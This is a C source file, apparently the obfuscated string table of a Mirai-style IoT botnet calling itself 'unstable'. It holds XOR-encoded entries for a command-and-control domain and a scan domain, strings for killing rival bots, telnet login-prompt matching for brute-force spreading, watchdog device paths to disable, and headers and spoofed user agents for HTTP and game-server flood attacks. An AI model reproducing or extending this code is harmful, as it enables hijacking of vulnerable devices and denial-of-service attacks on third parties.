#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeaddaad;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{   
    add_entry(TABLE_EXEC_SUCCESS, "\x51\x4A\x31\x50\x30\x3C\x48\x37\x29\x6D\x77\x29\x67\x6B\x6B\x68\x04", 17); // yoursystemhasbeenupdated~~unstable~
    add_entry(TABLE_CNC_DOMAIN, "\x67\x6A\x77\x69\x65\x67\x67\x65\x77\x2A\x60\x71\x67\x6F\x60\x6A\x77\x2A\x6B\x76\x63\x04", 22); // 
    add_entry(TABLE_SCAN_DOMAIN, "\x77\x67\x65\x6A\x69\x65\x67\x67\x65\x77\x2A\x60\x71\x67\x6F\x60\x6A\x77\x2A\x6B\x76\x63\x04", 23); // 
    
    add_entry(TABLE_KILLER_PROC, "\x2B\x74\x76\x6B\x67\x2B\x04", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x2B\x61\x7C\x61\x04", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x2B\x62\x60\x04", 4); // /fd
    add_entry(TABLE_KILLER_MAPS, "\x2B\x69\x6A\x70\x04", 6); // /maps
    add_entry(TABLE_KILLER_STATUS, "\x2B\x77\x70\x65\x70\x71\x77\x04", 8); // /status
    add_entry(TABLE_KILLER_TCP, "\x2B\x74\x76\x6B\x67\x2B\x6A\x61\x70\x2B\x70\x67\x74\x04", 14); // /proc/net/tcp
    add_entry(TABLE_KILLER_CMDLINE, "\x2B\x67\x69\x60\x68\x6D\x6A\x61\x04", 9); // /cmdline
    add_entry(TABLE_KILLER_TMP, "\x2B\x70\x69\x74\x2B\x04", 6); // tmp/
    add_entry(TABLE_KILLER_DATALOCAL, "\x2B\x60\x65\x70\x65\x2B\x68\x6B\x67\x65\x68\x2B\x70\x69\x74\x04", 16); // data/local
    add_entry(TABLE_KILLER_QTX, "\x75\x70\x7C\x66\x6B\x70\x04", 7); // qtxbot
    add_entry(TABLE_KILLER_DOT, "\x2A\x04", 2); // .
    add_entry(TABLE_KILLER_ARM, "\x65\x76\x69\x04", 4); // arm
    add_entry(TABLE_KILLER_X86, "\x7C\x3C\x32\x04", 4); // x86
    add_entry(TABLE_KILLER_SH4, "\x77\x6C\x30\x04", 4); // sh4
    add_entry(TABLE_KILLER_MIPS, "\x69\x6D\x74\x77\x04", 5); // mips
    add_entry(TABLE_KILLER_MPSL, "\x69\x74\x77\x68\x04", 5); // mpsl
    add_entry(TABLE_KILLER_SDA, "\x77\x60\x65\x04", 4); // sda
    add_entry(TABLE_KILLER_MTD, "\x69\x70\x60\x04", 4); // mtd
    add_entry(TABLE_KILLER_QTX2, "\x66\x6B\x70\x26\x59\x04", 6); // bot"]
    add_entry(TABLE_KILLER_HAKAI, "\x6C\x65\x6F\x65\x6D\x04", 6); // hakai

    add_entry(TABLE_SCAN_SHELL, "\x77\x6C\x61\x68\x68\x04", 6); // shell
    add_entry(TABLE_SCAN_ENABLE, "\x61\x6A\x65\x66\x68\x61\x04", 7); // enable
    add_entry(TABLE_SCAN_SYSTEM, "\x77\x7D\x77\x70\x61\x69\x04", 7); // system
    add_entry(TABLE_SCAN_SH, "\x77\x6C\x04", 3); // sh
    add_entry(TABLE_SCAN_LSHELL, "\x68\x6D\x6A\x71\x7C\x77\x6C\x61\x68\x68\x04", 11); // linuxshell
    add_entry(TABLE_SCAN_QUERY, "\x2B\x66\x6D\x6A\x2B\x66\x71\x77\x7D\x66\x6B\x7C\x24\x51\x4A\x57\x50\x45\x46\x48\x41\x04", 22); // /bin/busybox UNSTABLE
    add_entry(TABLE_SCAN_RESP, "\x51\x4A\x57\x50\x45\x46\x48\x41\x3E\x24\x65\x74\x74\x68\x61\x70\x24\x6A\x6B\x70\x24\x62\x6B\x71\x6A\x60\x04", 27); // UNSTABLE: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x6A\x67\x6B\x76\x76\x61\x67\x70\x04", 9); // ncorrect
    add_entry(TABLE_SCAN_OGIN, "\x6B\x63\x6D\x6A\x04", 5); // ogin
    add_entry(TABLE_SCAN_ASSWORD, "\x65\x77\x77\x73\x6B\x76\x60\x04", 8); // assword
    add_entry(TABLE_SCAN_ENTER, "\x61\x6A\x70\x61\x76\x04", 6); // enter

    add_entry(TABLE_WATCHDOG_1, "\x2B\x60\x61\x72\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 14); // /dev/watchdog
    add_entry(TABLE_WATCHDOG_2, "\x2B\x60\x61\x72\x2B\x69\x6D\x77\x67\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 19); // /dev/misc/watchdog
    add_entry(TABLE_WATCHDOG_3, "\x2B\x77\x66\x6D\x6A\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 15); // /sbin/watchdog
    add_entry(TABLE_WATCHDOG_4, "\x2B\x66\x6D\x6A\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 14); // /bin/watchdog
    add_entry(TABLE_WATCHDOG_5, "\x2B\x60\x61\x72\x2B\x42\x50\x53\x40\x50\x35\x34\x35\x5B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_WATCHDOG_6, "\x2B\x60\x61\x72\x2B\x42\x50\x53\x40\x50\x35\x34\x35\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 23); // /dev/FTWDT101/watchdog
    add_entry(TABLE_WATCHDOG_7, "\x2B\x60\x61\x72\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x34\x04", 15); // /dev/watchdog0
    add_entry(TABLE_WATCHDOG_8, "\x2B\x61\x70\x67\x2B\x60\x61\x62\x65\x71\x68\x70\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 22); // /etc/default/watchdog
    add_entry(TABLE_WATCHDOG_9, "\x2B\x61\x70\x67\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 14); // /etc/watchdog

    add_entry(TABLE_RANDOM, "\x65\x45\x77\x35\x36\x30\x36\x67\x34\x31\x42\x63\x6E\x30\x04", 15);

    add_entry(TABLE_ATK_VSE, "\x50\x57\x6B\x71\x76\x67\x61\x24\x41\x6A\x63\x6D\x6A\x61\x24\x55\x71\x61\x76\x7D\x04", 21); // TSource Engine Query
    add_entry(TABLE_ATK_RESOLVER, "\x2B\x61\x70\x67\x2B\x76\x61\x77\x6B\x68\x72\x2A\x67\x6B\x6A\x62\x04", 17); // /etc/resolv.conf
    add_entry(TABLE_ATK_NSERV, "\x6A\x65\x69\x61\x77\x61\x76\x72\x61\x76\x24\x04", 12); // ---nameserver ---
    
    add_entry(TABLE_ATK_KEEP_ALIVE, "\x47\x6B\x6A\x6A\x61\x67\x70\x6D\x6B\x6A\x3E\x24\x6F\x61\x61\x74\x29\x65\x68\x6D\x72\x61\x04", 23); // ---Connection: keep-alive---
    add_entry(TABLE_ATK_ACCEPT, "\x45\x67\x67\x61\x74\x70\x3E\x24\x70\x61\x7C\x70\x2B\x6C\x70\x69\x68\x28\x65\x74\x74\x68\x6D\x67\x65\x70\x6D\x6B\x6A\x2B\x7C\x6C\x70\x69\x68\x2F\x7C\x69\x68\x28\x65\x74\x74\x68\x6D\x67\x65\x70\x6D\x6B\x6A\x2B\x7C\x69\x68\x3F\x75\x39\x34\x2A\x3D\x28\x6D\x69\x65\x63\x61\x2B\x73\x61\x66\x74\x28\x2E\x2B\x2E\x3F\x75\x39\x34\x2A\x3C\x04", 83); // ---Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8---
    add_entry(TABLE_ATK_ACCEPT_LNG, "\x45\x67\x67\x61\x74\x70\x29\x48\x65\x6A\x63\x71\x65\x63\x61\x3E\x24\x61\x6A\x29\x51\x57\x28\x61\x6A\x3F\x75\x39\x34\x2A\x3C\x04", 32); // ---Accept-Language: en-US,en;q=0.8---
    add_entry(TABLE_ATK_CONTENT_TYPE, "\x47\x6B\x6A\x70\x61\x6A\x70\x29\x50\x7D\x74\x61\x3E\x24\x65\x74\x74\x68\x6D\x67\x65\x70\x6D\x6B\x6A\x2B\x7C\x29\x73\x73\x73\x29\x62\x6B\x76\x69\x29\x71\x76\x68\x61\x6A\x67\x6B\x60\x61\x60\x04", 48); // ---Content-Type: application/x-www-form-urlencoded---
    add_entry(TABLE_ATK_SET_COOKIE, "\x77\x61\x70\x47\x6B\x6B\x6F\x6D\x61\x2C\x23\x04", 12); // ---setCookie('---
    add_entry(TABLE_ATK_REFRESH_HDR, "\x76\x61\x62\x76\x61\x77\x6C\x3E\x04", 9); // ---refresh:---
    add_entry(TABLE_ATK_LOCATION_HDR, "\x68\x6B\x67\x65\x70\x6D\x6B\x6A\x3E\x04", 10); // ---location:---
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x77\x61\x70\x29\x67\x6B\x6B\x6F\x6D\x61\x3E\x04", 12); // ---set-cookie:---
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x67\x6B\x6A\x70\x61\x6A\x70\x29\x68\x61\x6A\x63\x70\x6C\x3E\x04", 16); // ---content-length:---
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x70\x76\x65\x6A\x77\x62\x61\x76\x29\x61\x6A\x67\x6B\x60\x6D\x6A\x63\x3E\x04", 19); // ----transfer-encoding:---
    add_entry(TABLE_ATK_CHUNKED, "\x67\x6C\x71\x6A\x6F\x61\x60\x04", 8); // ---chunked---
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x6F\x61\x61\x74\x29\x65\x68\x6D\x72\x61\x04", 11); // ---keep-alive---
    add_entry(TABLE_ATK_CONNECTION_HDR, "\x67\x6B\x6A\x6A\x61\x67\x70\x6D\x6B\x6A\x3E\x04", 12); // -----connection:---
    add_entry(TABLE_ATK_DOSARREST, "\x77\x61\x76\x72\x61\x76\x3E\x24\x60\x6B\x77\x65\x76\x76\x61\x77\x70\x04", 18); // ---server: dosarrest---
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x77\x61\x76\x72\x61\x76\x3E\x24\x67\x68\x6B\x71\x60\x62\x68\x65\x76\x61\x29\x6A\x63\x6D\x6A\x7C\x04", 25); // ------server: cloudflare-nginx------

    add_entry(TABLE_HTTP_1, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x35\x34\x2A\x34\x3F\x24\x53\x4B\x53\x32\x30\x2D\x24\x45\x74\x74\x68\x61\x53\x61\x66\x4F\x6D\x70\x2B\x31\x37\x33\x2A\x37\x32\x24\x2C\x4F\x4C\x50\x49\x48\x28\x24\x68\x6D\x6F\x61\x24\x43\x61\x67\x6F\x6B\x2D\x24\x47\x6C\x76\x6B\x69\x61\x2B\x31\x35\x2A\x34\x2A\x36\x33\x34\x30\x2A\x35\x34\x37\x24\x57\x65\x62\x65\x76\x6D\x2B\x31\x37\x33\x2A\x37\x32\x04", 111); // ---Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36---
    add_entry(TABLE_HTTP_2, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x35\x34\x2A\x34\x3F\x24\x53\x4B\x53\x32\x30\x2D\x24\x45\x74\x74\x68\x61\x53\x61\x66\x4F\x6D\x70\x2B\x31\x37\x33\x2A\x37\x32\x24\x2C\x4F\x4C\x50\x49\x48\x28\x24\x68\x6D\x6F\x61\x24\x43\x61\x67\x6F\x6B\x2D\x24\x47\x6C\x76\x6B\x69\x61\x2B\x31\x36\x2A\x34\x2A\x36\x33\x30\x37\x2A\x35\x35\x32\x24\x57\x65\x62\x65\x76\x6D\x2B\x31\x37\x33\x2A\x37\x32\x04", 111); // ---Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36---
    add_entry(TABLE_HTTP_3, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x32\x2A\x35\x3F\x24\x53\x4B\x53\x32\x30\x2D\x24\x45\x74\x74\x68\x61\x53\x61\x66\x4F\x6D\x70\x2B\x31\x37\x33\x2A\x37\x32\x24\x2C\x4F\x4C\x50\x49\x48\x28\x24\x68\x6D\x6F\x61\x24\x43\x61\x67\x6F\x6B\x2D\x24\x47\x6C\x76\x6B\x69\x61\x2B\x31\x35\x2A\x34\x2A\x36\x33\x34\x30\x2A\x35\x34\x37\x24\x57\x65\x62\x65\x76\x6D\x2B\x31\x37\x33\x2A\x37\x32\x04", 110); // ---Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36---
    add_entry(TABLE_HTTP_4, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x32\x2A\x35\x3F\x24\x53\x4B\x53\x32\x30\x2D\x24\x45\x74\x74\x68\x61\x53\x61\x66\x4F\x6D\x70\x2B\x31\x37\x33\x2A\x37\x32\x24\x2C\x4F\x4C\x50\x49\x48\x28\x24\x68\x6D\x6F\x61\x24\x43\x61\x67\x6F\x6B\x2D\x24\x47\x6C\x76\x6B\x69\x61\x2B\x31\x36\x2A\x34\x2A\x36\x33\x30\x37\x2A\x35\x35\x32\x24\x57\x65\x62\x65\x76\x6D\x2B\x31\x37\x33\x2A\x37\x32\x04", 110); // ---Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36---
    add_entry(TABLE_HTTP_5, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x49\x65\x67\x6D\x6A\x70\x6B\x77\x6C\x3F\x24\x4D\x6A\x70\x61\x68\x24\x49\x65\x67\x24\x4B\x57\x24\x5C\x24\x35\x34\x5B\x35\x35\x5B\x32\x2D\x24\x45\x74\x74\x68\x61\x53\x61\x66\x4F\x6D\x70\x2B\x32\x34\x35\x2A\x33\x2A\x33\x24\x2C\x4F\x4C\x50\x49\x48\x28\x24\x68\x6D\x6F\x61\x24\x43\x61\x67\x6F\x6B\x2D\x24\x52\x61\x76\x77\x6D\x6B\x6A\x2B\x3D\x2A\x35\x2A\x36\x24\x57\x65\x62\x65\x76\x6D\x2B\x32\x34\x35\x2A\x33\x2A\x33\x04", 117); // ---Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7---
    add_entry(TABLE_HTTP_6, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x30\x2A\x34\x24\x2C\x67\x6B\x69\x74\x65\x70\x6D\x66\x68\x61\x3F\x24\x49\x57\x4D\x41\x24\x3D\x2A\x34\x3F\x24\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x31\x2A\x35\x3F\x24\x50\x76\x6D\x60\x61\x6A\x70\x2B\x31\x2A\x34\x2D\x04", 64); // ---Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)---
    add_entry(TABLE_HTTP_7, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x30\x2A\x34\x24\x2C\x67\x6B\x69\x74\x65\x70\x6D\x66\x68\x61\x3F\x24\x49\x57\x4D\x41\x24\x3D\x2A\x34\x3F\x24\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x32\x2A\x34\x3F\x24\x50\x76\x6D\x60\x61\x6A\x70\x2B\x30\x2A\x34\x3F\x24\x43\x50\x46\x33\x2A\x30\x3F\x24\x4D\x6A\x62\x6B\x54\x65\x70\x6C\x2A\x37\x3F\x24\x57\x52\x35\x3F\x24\x2A\x4A\x41\x50\x24\x47\x48\x56\x24\x37\x2A\x30\x2A\x31\x37\x37\x32\x34\x3F\x24\x53\x4B\x53\x32\x30\x3F\x24\x61\x6A\x29\x51\x57\x2D\x04", 123); // ---Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)---
    add_entry(TABLE_HTTP_8, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x30\x2A\x34\x24\x2C\x67\x6B\x69\x74\x65\x70\x6D\x66\x68\x61\x3F\x24\x49\x57\x4D\x41\x24\x3D\x2A\x34\x3F\x24\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x32\x2A\x35\x3F\x24\x50\x76\x6D\x60\x61\x6A\x70\x2B\x30\x2A\x34\x3F\x24\x42\x40\x49\x3F\x24\x49\x57\x4D\x41\x47\x76\x65\x73\x68\x61\x76\x3F\x24\x49\x61\x60\x6D\x65\x24\x47\x61\x6A\x70\x61\x76\x24\x54\x47\x24\x31\x2A\x34\x2D\x04", 103); // ---Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)---
    add_entry(TABLE_HTTP_9, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x30\x2A\x34\x24\x2C\x67\x6B\x69\x74\x65\x70\x6D\x66\x68\x61\x3F\x24\x49\x57\x4D\x41\x24\x3D\x2A\x34\x3F\x24\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x32\x2A\x35\x3F\x24\x50\x76\x6D\x60\x61\x6A\x70\x2B\x30\x2A\x34\x3F\x24\x43\x50\x46\x33\x2A\x30\x3F\x24\x4D\x6A\x62\x6B\x54\x65\x70\x6C\x2A\x36\x3F\x24\x57\x52\x35\x3F\x24\x2A\x4A\x41\x50\x24\x47\x48\x56\x24\x30\x2A\x30\x2A\x31\x3C\x33\x3D\x3D\x3F\x24\x53\x4B\x53\x32\x30\x3F\x24\x61\x6A\x29\x51\x57\x2D\x04", 123); // ---Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)---
    add_entry(TABLE_HTTP_10, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x30\x2A\x34\x24\x2C\x67\x6B\x69\x74\x65\x70\x6D\x66\x68\x61\x3F\x24\x49\x57\x4D\x41\x24\x3D\x2A\x34\x3F\x24\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x32\x2A\x35\x3F\x24\x50\x76\x6D\x60\x61\x6A\x70\x2B\x31\x2A\x34\x3F\x24\x42\x71\x6A\x53\x61\x66\x54\x76\x6B\x60\x71\x67\x70\x77\x2D\x04", 80); // ---Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)---
    add_entry(TABLE_HTTP_11, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x49\x65\x67\x6D\x6A\x70\x6B\x77\x6C\x3F\x24\x4D\x6A\x70\x61\x68\x24\x49\x65\x67\x24\x4B\x57\x24\x5C\x24\x35\x34\x2A\x32\x3F\x24\x76\x72\x3E\x36\x31\x2A\x34\x2D\x24\x43\x61\x67\x6F\x6B\x2B\x36\x34\x35\x34\x34\x35\x34\x35\x24\x42\x6D\x76\x61\x62\x6B\x7C\x2B\x36\x31\x2A\x34\x04", 82); // ---Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0---
    add_entry(TABLE_HTTP_12, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x49\x65\x67\x6D\x6A\x70\x6B\x77\x6C\x3F\x24\x4D\x6A\x70\x61\x68\x24\x49\x65\x67\x24\x4B\x57\x24\x5C\x24\x35\x34\x2A\x3C\x3F\x24\x76\x72\x3E\x36\x35\x2A\x34\x2D\x24\x43\x61\x67\x6F\x6B\x2B\x36\x34\x35\x34\x34\x35\x34\x35\x24\x42\x6D\x76\x61\x62\x6B\x7C\x2B\x36\x35\x2A\x34\x04", 82); // ---Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0---
    add_entry(TABLE_HTTP_13, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x49\x65\x67\x6D\x6A\x70\x6B\x77\x6C\x3F\x24\x4D\x6A\x70\x61\x68\x24\x49\x65\x67\x24\x4B\x57\x24\x5C\x24\x35\x34\x2A\x3C\x3F\x24\x76\x72\x3E\x36\x30\x2A\x34\x2D\x24\x43\x61\x67\x6F\x6B\x2B\x36\x34\x35\x34\x34\x35\x34\x35\x24\x42\x6D\x76\x61\x62\x6B\x7C\x2B\x36\x30\x2A\x34\x04", 82); // ---Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0---
    add_entry(TABLE_HTTP_14, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x49\x65\x67\x6D\x6A\x70\x6B\x77\x6C\x3F\x24\x4D\x6A\x70\x61\x68\x24\x49\x65\x67\x24\x4B\x57\x24\x5C\x24\x35\x34\x5B\x35\x34\x3F\x24\x76\x72\x3E\x37\x37\x2A\x34\x2D\x24\x43\x61\x67\x6F\x6B\x2B\x36\x34\x35\x34\x34\x35\x34\x35\x24\x42\x6D\x76\x61\x62\x6B\x7C\x2B\x37\x37\x2A\x34\x04", 83); // ---Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0---
    add_entry(TABLE_HTTP_15, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x35\x34\x2A\x34\x3F\x24\x53\x6D\x6A\x32\x30\x3F\x24\x7C\x32\x30\x2D\x24\x45\x74\x74\x68\x61\x53\x61\x66\x4F\x6D\x70\x2B\x31\x37\x33\x2A\x37\x32\x24\x2C\x4F\x4C\x50\x49\x48\x28\x24\x68\x6D\x6F\x61\x24\x43\x61\x67\x6F\x6B\x2D\x24\x47\x6C\x76\x6B\x69\x61\x2B\x32\x36\x2A\x34\x2A\x37\x36\x34\x36\x2A\x3D\x30\x04", 101); // ---Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94---


}


void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("(unstable/table) tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("(unstable/table) tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("(unstable/table) tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
